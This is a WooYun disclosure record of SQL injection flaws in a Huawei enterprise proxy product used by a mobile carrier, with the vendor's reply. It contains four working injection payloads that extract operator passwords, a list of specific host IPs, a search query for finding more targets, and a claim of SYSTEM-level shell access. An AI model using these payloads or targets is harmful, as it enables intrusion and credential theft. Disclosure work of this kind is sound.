{"id": 65367, "wybug_id": "wooyun-2015-0123639", "wybug_title": "华为企业代理服务器多处SQL注入漏洞打包/SA（SYSTEM）权限", "wybug_corp": "华为技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-06-30 12:33", "wybug_open_date": "2015-09-29 10:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-29：\t细节向公众公开  简要描述： 某运营商使用的系统多处SQL注入漏洞打包，SA（SYSTEM）权限 详细说明：  中国移动大量使用的某系统多处SQL注入漏洞打包，SA（SYSTEM）权限 之前漏洞让提交案例……不好意思，给忘记了……现在补上案例：\n如果下面的不够：使用zoomeye搜索：Server: Resin/2.1.10  country:Chinahttp://122.224.89.219/mms/musicManager.jsphttp://61.233.42.78/mms/musicManager.jsphttp://61.153.181.190:81/mms/musicManager.jsphttp://61.236.195.164/mms/musicManager.jsphttp://61.233.42.73/mms/musicManager.jsp\n\n\n\n各种信息泄露，以及注入点SA权限，直接获取SYSTEM，可以添加用户远登~\n 系统同： WooYun: 企业代理服务器设计问题 由于涉及中国移动（使用）和华为（开发），故交由厂商写着CNCERT协调 一共4处注入，分别POC如下 POC： 1. \n/mms/musicManager.jsp POST:musicType=0&musicByname=0' UNION ALL SELECT top 1 NULL,NULL,password,NULL,NULL,NULL,NULL,NULL from tbl_Operator--&findNowBut=%B2%E9%D1%AF&page=1&isFindNow=1\n 2. \n/mms/musicList.jsp POST:musicTypeadmin=0' UNION ALL SELECT top 1 NULL,NULL,Operator_Code,NULL,NULL,NULL,NULL,NULL from tbl_Operator-- &musicType=0&musicByname=aaa&findNowBut=%B2%E9%D1%AF&page=1&isFindNow=1\n 3. \n/mms/picList.jsp POST:picTypeadmin=0' UNION ALL SELECT top 1 NULL,NULL,Operator_Code,Operator_Code,NULL,NULL,NULL,NULL from tbl_Operator-- &picType=0&picByname=aaa&findNowBut=%B2%E9%D1%AF&page=1&isFindNow=1\n 4. \n/mms/picManager.jsp POST:picType=0' UNION ALL SELECT top 1 NULL,Operator_Code,Password,NULL,NULL,NULL,NULL,NULL from tbl_Operator-- &picByname=aaa&findNowBut=%B2%E9%D1%AF&page=1& isFindNow=1&picByname=aaa&findNowBut=%B2%E9%D1%AF&page=1&isFindNow=1\n 证明图： \n\n \n\n \n\n \n\n \n再来看看系统权限：--OS-SHELL：得到：nt authority\\system。。。。这都SYSTEM了，不需要我拿SHELL和登录了吧。。。\n \n\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-01 10:47 厂商回复： 多谢白帽子对华为公司IT安全的关注。该漏洞存在于企业信息机产品EIE V400R001版本中，该版本已于2014年6月30日EOS（End of Service）。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-09 22:47 |    \t\tWeiy、 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:6        | 为了梦想我会一直前行、)\t\t \n  @疯狗 @浩天  http://loudong.360.cn/vul/info/qid/QTVA-2015-251879 这个不是重复吗、    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}